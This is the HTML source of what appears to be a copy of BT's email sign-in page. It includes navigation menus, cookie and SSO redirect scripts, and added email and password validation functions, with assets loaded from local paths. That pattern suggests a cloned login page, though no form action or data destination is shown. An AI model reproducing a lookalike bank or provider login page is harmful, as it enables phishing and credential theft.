            <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fbillingdashboard">Your bills</a></li>
            <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fusage">Your usage</a></li>
            <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fbillhistory">Your billing history</a></li>
              <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fbillsettings">Your bill settings</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div><span>Your products</span></div>
        <ul style="">
            <li><a href=" https://my.bt.com/s/apps/appsmybt/#/packages">Your products</a></li>
             </ul>
    </li>
    <li class="bt-navbar-menu-col-20-percent">
        <div><span>Upgrade</span></div>
        <ul style="">
            <li><a href="https://my.bt.com/exclusiveoffers">Broadband </a></li>
            <li><a href="https://www.bt.com/personalised-tv-packages/">TV </a></li>
            <li><a href="https://my.bt.com/mymobile/">Mobile </a></li>
            <li><a href="https://www.bt.com/sport/">Sport </a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div><span>Your details</span></div>
        <ul style="">
            <li><a href="https://my.bt.com/s/apps/appsselfserve/index.html?/profile">Personal details</a></li>
            <li><a href="https://my.bt.com/s/apps/appsselfserve/index.html#/accounts">Account details</a></li>
        </ul>
    </li>

    <li class="bt-navbar-menu-col-15-percent">
        <div><span>Orders and faults</span></div>
        <ul style="">
            <li><a href="https://my.bt.com/s/apps/appsorder/customer/index.html#/index?s_cid=con_FURL_order">Track your order</a></li>
            <li><a href="https://support.bt.com/track/fault/?view=faulttracker">Track a fault</a></li>
            
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div class="bt-navbar-login-logout"><a class="bt-navbar-chevron" href="https://home.bt.com/secure/loginforward?view=mybt&amp;redirectURL=https%3A%2F%2Fmy.bt.com%2Fmybt">Log in</a></div>
        <div class="bt-navbar-login-logout"><a class="bt-navbar-chevron" href="https://my.bt.com/mybt/signup">Sign up</a></div>
		<div class="bt-navbar-login-logout"><a class="bt-navbar-chevron" href="https://www.bt.com/about-my-bt/">About My BT</a></div>
    </li>
</ul></li><li class="bt-navbar-screen-md-main"><a href="https://signin1.bt.com/login/emailloginform" aria-haspopup="true" aria-expanded="false"><span class="bt-navbar-selected">Email</span></a></li><li class="bt-navbar-screen-not-main"><a href="https://business.bt.com/" aria-haspopup="true" aria-expanded="false"><span>UK Business</span></a></li><li class="bt-navbar-screen-not-main"><a href="https://www.globalservices.bt.com/uk/en/home" aria-haspopup="true" aria-expanded="false"><span>Global Business</span></a></li><li class="bt-navbar-logout-mobile bt-navbar-screen-not-main"> <a href="https://signin1.bt.com/btapps/logout?external_target=https%3A%2F%2Fhome%2Ebt%2Ecom%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%3A%2F%2Fsignin1%2Ebt%2Ecom%2Fbtmail%2Fsecure%2Femaillogin">Log out</a> </li><li class="bt-navbar-button bt-navbar-more-item" style="display: none;"> <a class="bt-navbar-more" href="#bt-navbar-global-nav-more" data-toggle="collapse" aria-expanded="false" aria-controls="bt-navbar-global-nav-more"> <span>More&nbsp;&nbsp;</span> <img class="dante-icon-chevron-down" src="chevy.png"></a> </li></ul></div></div><!-- more menu items --> <div id="bt-navbar-global-nav-more" class="collapse bt-navabar-menu bt-navbar-menu-more" style="display: none;"> <div class="bt-navbar-top-menu"> <ul><li class="bt-navbar-screen-xs-max-more"><a href="https://www.bt.com/broadband" aria-haspopup="true" aria-expanded="false"><span>Broadband</span></a><ul class="bt-navbar-dropdown bt-navbar-products-menu" aria-hidden="true" role="menu" style="width: 1154px;"> 
	<li class="bt-navbar-menu-col-40-percent">
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/broadband/">Broadband</a></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://www.bt.com/broadband/deals/">Broadband deals</a></li>
			<li><a href="https://www.bt.com/broadband/upgrade/">Upgrade broadband</a></li> 
			<li><a href="https://www.bt.com/tv/packages/">TV &amp; broadband</a></li> 
			<li><a href="https://www.bt.com/broadband/fibre/">Fibre broadband</a></li> 
			<li><a href="https://www.bt.com/broadband/full-fibre">Full Fibre broadband</a></li> 			
			<li><a href="https://www.shop.bt.com/broadband">Broadband accessories</a></li> 
		</ul>
		<ul class="bt-navbar-menu-col-50-percent">
			<li><a href="https://www.bt.com/broadband/complete-wifi">Complete Wi-Fi</a></li> 
			<li><a href="https://www.bt.com/broadband/extras/">Broadband extras</a></li> 			 
			<li><a href="https://www.bt.com/broadband/smart-hub/">Smart Hub</a></li> 
		</ul> 
	</li> 
	<li class="bt-navbar-menu-col-30-percent"> 
	<div><a class="bt-navbar-chevron" href="https://www.bt.com/landline/">Landline</a></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://www.bt.com/landline/deals/">Landline deals</a></li>						
		</ul>
		<ul class="bt-navbar-menu-col-50-percent">	
            <li><a href="https://www.bt.com/landline/manage/">Manage landline</a></li> 
			<li><a href="https://www.bt.com/landline/calling-features/">Calling features</a></li> 
			<li><a href="https://www.bt.com/landline/calling-costs/">Calling costs</a></li>
			<li><a href="https://shop.bt.com/landline">Buy a home phone</a></li>
		</ul> 		
	</li>
	<li class="bt-navbar-menu-col-30-percent"> 
	<div><span>Switching to BT and Moving</span></div> 
		<ul> 
			<li><a href="https://www.bt.com/broadband/switch/">How to switch broadband</a></li> 
			<li><a href="https://www.bt.com/manage/moving-home/">Moving home</a></li>			
		</ul> 
	</li>			
</ul></li><li class="bt-navbar-screen-sm-more"><a href="https://www.bt.com/tv/" aria-haspopup="true" aria-expanded="false"><span>TV</span></a><ul class="bt-navbar-dropdown bt-navbar-bt-tv-menu" aria-hidden="true" role="menu" style="width: 1154px;">
    <li class="bt-navbar-menu-col-30-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/tv/">TV</a></div>
        <ul>
            <li><a href="https://www.bt.com/tv/packages/">TV deals</a></li>
            <li><a href="https://www.bt.com/tv/add/">Add TV</a></li>
            <li><a href="https://www.bt.com/tv/about-tv ">About BT TV</a></li>
            <li><a href="https://www.bt.com/personalised-tv-packages">Change TV</a></li>
        </ul>
       </li>
    <li class="bt-navbar-menu-col-30-percent">
        <div><span>Switching to BT</span></div>
        <ul>
            <li><a href="https://www.bt.com/broadband/switch/">How to switch TV and broadband</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-20-percent">
        <div><span>Find and watch TV</span></div>
        <ul>
            <li><a href="https://www.player.bt.com/#/livetv/fulltvlistings">TV Guide</a></li>
            <li><a href="https://www.bt.com/tv/best-of-tv/">Best of TV</a></li>
			<li><a href=" https://www.bt.com/tv/on-demand/now-tv/">NOW TV</a></li>
            <li><a href="https://www.bt.com/tv/on-demand/netflix/">Netflix</a></li>
            <li><a href="https://www.bt.com/tv/on-demand/amazon-prime-video/">Amazon Prime Video </a></li>
            <li><a href="https://www.player.bt.com/#/home">What's on</a></li>
            <li><a href="https://www.player.bt.com/#/tvstore">BT TV Store</a></li>
            <li><a href="https://www.player.bt.com/#/mytv/">TV purchases</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-20-percent">
        <div><span>Find and watch sport</span></div>
        <ul>
            <li><a href="https://sport.bt.com/tv-guide-01363810618853">Sport TV Guide</a></li>
            <li><a href="https://sport.bt.com/live-on-bt-sport-01364117948039">Live on BT Sport</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/bt-sport-1-01363810201090 ">BT Sport 1</a> </li>
            <li><a href="https://sport.bt.com/btsportplayer/bt-sport-2-01363810201819 ">BT Sport 2</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/bt-sport-3-01363992468652 ">BT Sport 3</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/espn-01363810201883 ">BT Sport / ESPN</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/boxnation-01364145606295 ">BoxNation</a></li>
        </ul>
    </li>
</ul></li><li class="bt-navbar-screen-sm-more"><a href="https://sport.bt.com/" aria-haspopup="true" aria-expanded="false"><span>Sport </span></a><ul class="bt-navbar-dropdown bt-navbar-bt-sport-menu" aria-hidden="true" role="menu" style="width: 1154px;"> 
	<li class="bt-navbar-menu-col-20-percent">
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/sport/">BT Sport Deals</a></div> 
			<ul> 
				<li><a href="https://www.bt.com/sport/tv/">BT Sport on TV deals</a></li> 
				<li><a href="https://www.bt.com/sport/app/">BT Sport App</a></li> 
				<li><a href="https://www.bt.com/sport/sky/">BT Sport on Sky TV</a></li> <li><a href="https://www.bt.com/sport/packages/">BT Sport on Sky TV with BT Broadband</a></li> 
				<li><a href="https://www.bt.com/sport/monthly-pass/">BT Sport Monthly Pass</a></li> 
				<li><a href="https://www.bt.com/sport/bt-sport-ultimate/">BT Sport Ultimate</a></li> 
				<li><a href="https://shop.bt.com/sport">BT Sport accessories</a></li> 
			</ul> 
	</li> 
	<li class="bt-navbar-menu-col-30-percent"><div><span>Watch Live</span></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sport-1-01363810201090">BT Sport 1</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sport-2-01363810201819">BT Sport 2</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sport-3-01363992468652">BT Sport 3</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sportespn-01363810201883">BT Sport / ESPN</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/boxnation-01364145606295">Box Nation</a></li> 
		</ul> 
		<ul class="bt-navbar-menu-col-50-percent">
			<li><a href="https://www.bt.com/sport/box-office/">BT Sport Box Office</a></li>
			<li><a href="https://sport.bt.com/all-videos/videos-01364228997406">On Demand</a></li> 
			<li><a href="https://sport.bt.com/live-on-bt-sport-01364117948039">What's on</a></li> 
			<li><a href="https://sport.bt.com/tv-guide-01363810618853">TV Guide</a></li> 
		</ul> 
	</li> 
	<li class="bt-navbar-menu-col-30-percent">
		<div><a class="bt-navbar-chevron" href="https://sport.bt.com/">Sports videos and news</a></div> 	
			<ul class="bt-navbar-menu-col-50-percent"> 
				<li><a href="https://sport.bt.com/football-01363810438492">Football</a></li> 
				<li><a href="https://sport.bt.com/boxing-01364050614609">Boxing</a></li> 
				<li><a href="https://sport.bt.com/motogp-01381782938496">MotoGP</a></li> 
				<li><a href="https://sport.bt.com/cricket-01364050608536">Cricket</a></li> 
			</ul> 
			<ul class="bt-navbar-menu-col-50-percent"> 
				<li><a href="https://sport.bt.com/rugby-union-01363810542305">Rugby Union</a></li> 
				<li><a href="https://sport.bt.com/ufc-01376634170992">UFC</a></li> 
				<li><a href="https://sport.bt.com/wwe-01364411684388">WWE</a></li> 
				<li><a href="https://sport.bt.com/more-sport-01363810551131">More Sports</a></li> 
			</ul> 
	</li> 
<li class="bt-navbar-menu-col-16-percent"> <div><a class="bt-navbar-chevron" href="https://home.bt.com/login/loginform?TARGET=$SM$https%3A%2F%2Fsport%2Ebt%2Ecom">Log in to BT Sport</a></div> </li></ul></li><li class="bt-navbar-screen-sm-more"><a href="https://www.bt.com/mobile" aria-haspopup="true" aria-expanded="false"><span>Mobile</span></a><ul class="bt-navbar-dropdown bt-navbar-products-menu" aria-hidden="true" role="menu" style="width: 1154px;"> 
	<li class="bt-navbar-menu-col-60-percent"> 
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/mobile/">Mobile</a></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://www.bt.com/mobile/sim-only-deals/">SIM Only deals</a></li> 
			<li><a href="https://www.bt.com/mobile/family-sim/">Family SIM deals</a></li> 
			<li><a href="https://www.bt.com/mobile/phones/">Mobile phones</a></li> 
			<li><a href="https://www.bt.com/mobile/data-sim/">Data SIM Only deals</a></li> 
			<li><a href="https://www.bt.com/mobile/upgrade">Upgrade mobile</a></li>  
			<li><a href="https://shop.bt.com/mobile">Mobile accessories</a></li> 
		</ul> 
		<ul class="bt-navbar-menu-col-30-percent">  
			<li><a href="https://www.bt.com/mobile/about/">Mobile features</a></li> 
			<li><a href="https://www.bt.com/mobile/coverage-checker/">Coverage checker</a></li> 
			<li><a href="https://www.bt.com/mobile/data-roaming/">Data roaming</a></li> 
			<li><a href="https://www.bt.com/mobile/5g/">5G</a></li> 
			<li><a href="https://www.bt.com/halo/no-limits">No Limits</a></li>
		</ul> 
	</li> 
	<li class="bt-navbar-menu-col-40-percent"> 
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/mobile/switch/">Switching to BT</a></div> 
		<ul> 
			<li><a href="https://www.bt.com/mobile/switch/">How to switch mobile</a></li> 
		</ul> 
	</li> 
</ul></li><li class="bt-navbar-screen-sm-more"><a href="https://www.bt.com/halo" aria-haspopup="true" aria-expanded="false"><span>Discover BT Halo</span></a></li><li class="bt-navbar-screen-md-more"><a href="https://www.bt.com/help/home/" aria-haspopup="true" aria-expanded="false"><span>Help</span></a><ul class="bt-navbar-dropdown bt-navbar-help-menu" aria-hidden="true" role="menu" style="width: 1154px;">
    <li class="bt-navbar-menu-col-25-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/help/">Help and support</a></div>
        <ul class="bt-navbar-menu-col-50-percent">
            <li><a href="https://www.bt.com/help/">Help home</a></li>
            <li><a href="https://www.bt.com/help/broadband/">Broadband</a></li>
            <li><a href="https://www.bt.com/help/account-and-billing">Billing</a></li>
            <li><a href="https://www.bt.com/help/email/">Email</a></li>
            <li><a href="https://www.bt.com/help/tv/">TV</a></li>
        </ul>
        <ul class="bt-navbar-menu-col-50-percent">
            <li><a href="https://www.bt.com/help/landline/">Landline</a></li>
            <li><a href="https://www.bt.com/help/security/">Security</a></li>
            <li><a href="https://www.bt.com/help/sport/">Sport</a></li>
            <li><a href="https://www.bt.com/help/mobile/">Mobile</a></li>
            <li><a href="https://www.bt.com/help/home/userguides/#/"> User guides </a> </li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-25-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/faults">Fault tracking and repair</a></div>
        <ul>
            <li><a href="https://www.bt.com/faults">Raise a fault</a></li>
            <li><a href="https://support.bt.com/track/fault/?view=faulttracker">Track a fault</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-35-percent">
        <div><span>Helpful links</span></div>
        <ul class="bt-navbar-menu-col-50-percent">
            <li><a href="https://www.bt.com/help/servicestatus">Check service in your area</a></li>
            <li><a href="https://support.bt.com/fix/bbspeedtest/">Test your broadband speed</a></li>
            <li><a href="https://www.bt.com/buy-our-products/store-finder">Find a BT Store</a></li>
            <li><a href="https://www.bt.com/help/account-and-billing/usernames-and-passwords/i-can-t-log-in/help-with-bt-usernames-and-passwords/">Password help</a></li>
            <li><a href="https://www.bt.com/manage/moving-home/">Moving home help</a></li>
        </ul>
        <ul class="bt-navbar-menu-col-50-percent">
            <li><a href="https://www.bt.com/appsordermgmt/public/index.do">Track your order</a></li>
            <li><a href="https://community.bt.com/">Ask the BT community</a></li>
            <li><a href="https://www.bt.com/help/home/newtobt.html">Getting started with your products</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/help/home/contactus/#/home">Get in touch</a></div>
        <ul>
            <li><a href="https://www.bt.com/help/home/contactus/#/home">Contact us</a></li>
            <li><a href="https://www.bt.com/help/home/complaints.html">Make a complaint</a></li>
            <li><a href="https://www.bt.com/help/home/scams/"> Report a scam call</a></li>
        </ul>
</li></ul>
</li><li class="bt-navbar-screen-md-more"><a href="https://home.bt.com/secure/loginforward?view=mybt&amp;redirectURL=https%3A%2F%2Fmy.bt.com%2Fmybt"><span>My BT </span></a>
<ul class="bt-navbar-dropdown bt-navbar-my-bt-menu bt-navbar-my-bt-menu-out" aria-hidden="true" role="menu" style="width: 1154px;">
    <li class="bt-navbar-menu-col-20-percent">
<div><span>Your bills and usage</span></div>
        <ul>    
            <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fbillingdashboard">Your bills</a></li>
            <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fusage">Your usage</a></li>
            <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fbillhistory">Your billing history</a></li>
              <li><a href="https://home.bt.com/secure/loginforward?siteArea=con.mya&amp;redirectURL=https://my.bt.com/s/apps/appsbills/index.html%23%2Fbillsettings">Your bill settings</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div><span>Your products</span></div>
        <ul>
            <li><a href=" https://my.bt.com/s/apps/appsmybt/#/packages">Your products</a></li>
             </ul>
    </li>
    <li class="bt-navbar-menu-col-20-percent">
        <div><span>Upgrade</span></div>
        <ul>
            <li><a href="https://my.bt.com/exclusiveoffers">Broadband </a></li>
            <li><a href="https://www.bt.com/personalised-tv-packages/">TV </a></li>
            <li><a href="https://my.bt.com/mymobile/">Mobile </a></li>
            <li><a href="https://www.bt.com/sport/">Sport </a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div><span>Your details</span></div>
        <ul>
            <li><a href="https://my.bt.com/s/apps/appsselfserve/index.html?/profile">Personal details</a></li>
            <li><a href="https://my.bt.com/s/apps/appsselfserve/index.html#/accounts">Account details</a></li>
        </ul>
    </li>

    <li class="bt-navbar-menu-col-15-percent">
        <div><span>Orders and faults</span></div>
        <ul>
            <li><a href="https://my.bt.com/s/apps/appsorder/customer/index.html#/index?s_cid=con_FURL_order">Track your order</a></li>
            <li><a href="https://support.bt.com/track/fault/?view=faulttracker">Track a fault</a></li>
            
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div class="bt-navbar-login-logout"><a class="bt-navbar-chevron" href="https://home.bt.com/secure/loginforward?view=mybt&amp;redirectURL=https%3A%2F%2Fmy.bt.com%2Fmybt">Log in</a></div>
        <div class="bt-navbar-login-logout"><a class="bt-navbar-chevron" href="https://my.bt.com/mybt/signup">Sign up</a></div>
		<div class="bt-navbar-login-logout"><a class="bt-navbar-chevron" href="https://www.bt.com/about-my-bt/">About My BT</a></div>
    </li>
</ul></li><li class="bt-navbar-screen-md-more"><a href="https://signin1.bt.com/login/emailloginform" aria-haspopup="true" aria-expanded="false"><span class="bt-navbar-selected">Email</span></a></li><li class="bt-navbar-screen-md-more"><a href="https://business.bt.com/" aria-haspopup="true" aria-expanded="false"><span>UK Business</span></a></li><li class="bt-navbar-screen-md-more"><a href="https://www.globalservices.bt.com/uk/en/home" aria-haspopup="true" aria-expanded="false"><span>Global Business</span></a></li><li class="bt-navbar-logout-mobile bt-navbar-screen-md-more bt-navbar-hidden"> <a href="https://signin1.bt.com/btapps/logout?external_target=https%3A%2F%2Fhome%2Ebt%2Ecom%2Flogin%2Floginform%3FTARGET%3D%24SM%24https%3A%2F%2Fsignin1%2Ebt%2Ecom%2Fbtmail%2Fsecure%2Femaillogin">Log out</a> </li></ul> </div> </div></div></div></div><script src="assets/responsive-menu.min.js"></script><script src="assets/260320/js/global-search.min"></script></nav>
<script src="assets/260320/js/dantenewgh.api-1.0"></script>
<script>
		var navconfig={"displayGlobalSearch":"N","displayMobileSearch":"Y","activePage":"email"};
		DanteNewGH.init(navconfig);
</script>
<!--Dante New Global header ended-->


<div id="main-content" class="tv-article none">
<div class="hero" id="hero">
<div id="fullskin">
<!-- Ads are disabled-->

</div>

<div class="container container-main-content">
<div class="row">
<div class="col-xs-12 col-md-4 col-md-push-8 col-lg-push-8 col-lg-4 rhr-col">
<script>
	var loginpagetype = 'customlogin';
	Encoder=function(){var e={encode:function(e){return e.replace(/./g,function(e,r){return e.match(/[\w\d]/)?e:"%"+e.charCodeAt(0).toString(16).toUpperCase()})},decode:function(e){return e.replace(/%[0-9A-Fa-f]{2}/g,function(e,r){return String.fromCharCode(parseInt(e.substring(1),16))})},getURLParameter:function(e){return decodeURIComponent((RegExp("[&|\\?]"+e+"=(.+?)(&|$)").exec(location.search)||[,""])[1])}};return{encodeUrl:e.encode,decodeUrl:e.decode,getURLParameter:e.getURLParameter}}();
	function reportErrors(errorCode){var settings={url:'https://signin1.bt.com'+'/logme?code='+errorCode,method:"GET",cache:!1,error:function(e,t,n){},success:function(){}}
	$.ajax(settings)}
	function expireCookie(cookieName){document.cookie=cookieName+'=;path=/;domain=.bt.com;expires=Thu, 01 Jan 1970 00:00:01 GMT;'}
	function getUserStatus(){smSessionValue=$.cookie("SMSESSION");if(smSessionValue==null||smSessionValue==''||smSessionValue=="LOGGEDOFF"){return"loggedout"}else{return"loggedin"}}
	function logDetails(e,o){var n={url:'https://signin1.bt.com/logme?code='+e+"extendedLogin&user="+o,method:"GET",cache:!1,timeout:5e3,error:function(e,o,n){},success:function(){}};$.ajax(n)}
	var customView = 'btmail';
	if (customView === "btmail") {
		var loggedinCustomer = getUserStatus() == "loggedin";
           var xloginExists = $.cookie("XLOGIN");
           var elbcExists = $.cookie("elbc");
           if (!loggedinCustomer) {
        	    var authFailureReasonCookie = $.cookie("AUTH_FAILURE_REASON");
        	    if (authFailureReasonCookie && authFailureReasonCookie == "11") {
	        		var usrName = $.cookie("SM_TRAPUSER");
					if (usrName) {
						reportErrors("CECOM");
						$("#displayPage").css("display", "none");
	            		$(".loading").css("display", "block");
						expireCookie("AUTH_FAILURE_REASON");
						expireCookie("SMUSRMSG");
						expireCookie("SMTRYNO");
						if ($.cookie("UserId")) {
							expireCookie("UserId");
						}
            			window.location.assign('https://my.bt.com'+'/appsyouraccount/youraccount_recovery/secure/enhanced/recoverybtid.do?oneId='+ usrName);
            		}
				}	           	
	         	if (xloginExists && elbcExists) {
	         		$("#displayPage").css("display", "none");
            		$(".loading").css("display", "block");
            		var owmhash = CryptoJS.SHA256("OWM").toString();
            		var mxhash = CryptoJS.SHA256("MX").toString();
					var xloginArr = xloginExists.replace(/"/g, "").split("|");
					if ((xloginArr.length == 1) || (xloginArr.length > 1 && owmhash == xloginArr[1])) {
						logDetails("OWM", xloginArr[0]);
						window.location.href = 'https://ux.btmail.bt.com'+'/cp/applink/core/AuthenticateWrapper';
					}  else if (xloginArr.length > 1 && mxhash == xloginArr[1]) {
						logDetails("MX", xloginArr[0]);
	         			window.location.href = 'https://email.bt.com'+'/mail/sso/enginep';
	         		} else {
	         			//Expire the cookie that exists.
						expireCookie("XLOGIN");
						expireCookie("elbc");
	         		}
				} else {
	         		//Expire the cookie that exists.
					expireCookie("XLOGIN");
					expireCookie("elbc");
	         	}
	         	if (Encoder.getURLParameter('TARGET')) {
	    			var target = Encoder.getURLParameter('TARGET');
	    			var targetParts = target.split("redirectURL=");
	    			var redirectUrl = (targetParts.length > 1) ? targetParts[1].replaceAll("[$]", "") : "";
	    			if(redirectUrl.indexOf("/btmail/secure/emaillogin") != -1 && redirectUrl.indexOf("SAMLRequest") != -1) {
	    				target = redirectUrl;
	    			} 
	    			if (target.indexOf("/btmail/secure/emaillogin") != -1 && target.indexOf("SAMLRequest") != -1) {
	    				var samltkns = target.split("SAMLRequest=");
	    				if (samltkns.length > 1) {
	    					var settings = {
	    		                    url: 'https://signin1.bt.com' + '/btmail/getUname?SAMLRequest='+ samltkns[1],
	    		                    method: "GET",
	    		                    cache: false,
	    		                    error: function(e, t, n) {
	    		                    	$("input[name='USER']").val('eg.user@btinternet.com');
	    		                    },
	    		                    success: function(data) {
	    		                    	$("input[name='USER']").val(data);
	    		                    	if ($("input[name='USER']").val() !== 'eg.user@btinternet.com') {
	    		                    		$("input[name='USER']").attr("disabled", "disabled");
	    									var newInput = document.createElement('input');
	    									newInput.name = 'USER';
	    									newInput.type = 'hidden';
	    									newInput.value = data;
	    									frm_login.appendChild(newInput);
	    		                    	}
	    		                    }
	    		                };
	    		                $.ajax(settings);
	    				}
	    			}
	    		}
           } else {
           		
					
						$("#displayPage").css("display", "none");
	            		$(".loading").css("display", "block");
						window.location.href = 'https://signin1.bt.com'+'/btmail/secure/emaillogin';
					
			    	
			}
	}
	var aAuth = false;
</script>
<div id="page-wrapper" class="email-signin-wrapper">
<div class="row">
<!-- Yahoo overlay switch -->
<!--Modal overlay starts -->
<div class="modal-backdrop in overlay-hide"></div>
<div class=" modal overlay-hide" id="myModal-overlay" style="display:block">
<div class="modal-dialog modal-dialog-centered">
<!-- sample Modal overlay starts--> <div class="modal" id="myModal-overlay"> <div class="modal-dialog modal-dialog-centered"> <div class="modal-content"> <div class="overlay-logo"> <img alt="BT logo" src="/s/assets/aauth/images/BT_logo.png"> </div><br> <div class="overlay-margin10"><span class="overlay-header">If you’re using an internet browser</span> <span class="overlay-body">(like Internet Explorer or Google Chrome)</span></div> <div class="overlay-body"> You may be using an old link, to view your email please go to <a href="https://www.bt.com/email">https://www.bt.com/email</a> </div> <br> <br> <div class="overlay-header">Setting up your email?</div> <div class="overlay-body"> It looks like you might have selected ‘Yahoo’ when setting up your email, please select ‘Other’ and then enter your email address and password. </div> <br> <br> <div class="overlay-header">Using the Yahoo mail mobile app? </div> <div class="overlay-body">Sorry, we don’t support new setups via the app anymore.</div> <br> <div class="overlay-body"> <a href="http://bt.custhelp.com/app/answers/detail/a_id/9962"> More information </a></div> <br><br> </div> </div> </div>

</div>
</div>
<!-- Modal overlay Ends -->
<script>
			function displayYoverlay(){$("#myModal-overlay").removeClass("overlay-hide"),$(".modal-backdrop").removeClass("overlay-hide")}
			function isYahooRequest(e){return-1!=e.indexOf("/btmail/secure/emaillogin")&&-1!=e.indexOf("SAMLRequest")&&-1!=e.indexOf("RelayState")}
			if (Encoder.getURLParameter('TARGET')) {
				var target = Encoder.getURLParameter('TARGET');
				var targetParts = target.split("redirectURL=");
				var redirectUrl = (targetParts.length > 1) ? targetParts[1].replaceAll("[$]", "") : "";
				if(isYahooRequest(redirectUrl)) {
					target = redirectUrl;
				}
				if (isYahooRequest(target)) {
					var threshold = parseInt(100);
					if ($.cookie("yoverlay") && (threshold >= 0)){
						displayYoverlay();
					} else {
						var randNum = Math.floor(Math.random() * 100);
						if (randNum < threshold){
							displayYoverlay();
							$.cookie("yoverlay","J5fM78nb",{domain:".bt.com",path:"/",expires:730,secure:!0});
						} else if (threshold < 0){
							if ($.cookie("yoverlay")){
								$.cookie("yoverlay", "", {domain :".bt.com",path : "/",expires : -1}); 
							}
						}	
					}
				}
			}
        </script>
        <script>

function validateEmail(){

var input = document.getElementById('inputIdEmail');

if(input.value.indexOf('@') === -1){

input.classList.add('errorbox');
document.getElementById('userLabel').style.fontWeight = 'bold';
             document.getElementById('userLabel').style.color = 'black'
return false




}else{


return true;

}



}






        </script>
            <script>

                function validatePassword(){
                
                var input = document.getElementById('password');
                
                if(input.value.length < 1){
                
                input.classList.add('errorbox');
                
             document.getElementById('passLabel').style.fontWeight = 'bold';
             document.getElementById('passLabel').style.color = 'black'
                return false
                
                
                
                
                }else{
                
                
                return true;
                
                }
                
                
                
                }
                
                
                
                
                
                
                        </script>

<div class="main-amber">
<!--<style>
.error-header a{
color: #fff;
text-decoration: underline;
}
</style>
-->
<!-- BT MAIL ALERT ON AMBERR -->
<!-- <div class="submit-warning">
<div class="pull-left yellow-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
We've had reports of a problem with BT Mail. We're working to establish what's wrong and will provide updates soon. Sorry if you're affected.
</div>
</div>
</div>
<div class="clear-both"></div>
-->
<!-- BT YAHOO MAIL ALERT ON AMBER -->
<!-- <div class="submit-warning">
<div class="pull-left yellow-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
We've had reports of a problem with BT Yahoo Mail. We're working to establish what's wrong and will provide updates soon. Sorry if you're affected.
</div>
</div>
</div>
<div class="clear-both"></div>
-->
<!-- EMAIL ALERT ON AMBER -->
<!-- <div class="submit-warning">
<div class="pull-left yellow-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
We've had reports of a problem with Email. We're working to establish what's wrong and will provide updates soon. Sorry if you're affected.
</div>
</div>
</div>
<div class="clear-both"></div>
-->
<!-- BT MAIL ALERT ON RED -->
<!-- <div class="submit-error">
<div class="pull-left red-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
Sorry, but we're having problems with BT Mail. We're working to get them sorted as soon as possible.
</div>
</div>
</div>
<div class="clear-both"></div>
-->
<!-- BT YAHOO MAIL ALERT ON RED -->
<!-- <div class="submit-error">
<div class="pull-left red-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
Sorry, but we're having problems with BT Yahoo Mail. We're working to get them sorted as soon as possible.
</div>
</div>
</div>
<div class="clear-both"></div>
-->
<!-- EMAIL ALERT ON RED -->
<!-- <div class="submit-error">
<div class="pull-left red-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
Sorry, but we're having problems with Email. We're working to get them sorted as soon as possible.
</div>
</div>
</div>
<div class="clear-both"></div>
-->
<!-- NO ERROR ALERT ON Green () -->
<!-- <div class="submit-green">
<div class="pull-left green-image">
</div>
<div class="error-text-wrapper">
<div class="error-header">
We're revamping BT Mail to make it even better. Find out more <a href = "https://community.bt.com/t5/Email/We-re-revamping-BT-Mail-to-make-your-experience-better-than-ever/td-p/1974938">here</a>
</div>
</div>
</div>
<div class="clear-both"></div>
-->

</div>
